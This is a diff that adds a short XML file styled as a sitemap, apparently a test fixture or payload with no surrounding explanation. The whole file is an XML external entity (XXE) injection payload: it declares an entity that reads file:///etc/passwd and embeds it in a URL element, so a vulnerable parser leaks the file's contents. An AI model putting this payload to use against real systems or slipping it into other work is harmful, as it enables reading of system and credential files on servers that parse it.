@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE urlset [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<urlset>
+  <url><loc>&secret;</loc></url>
+</urlset>
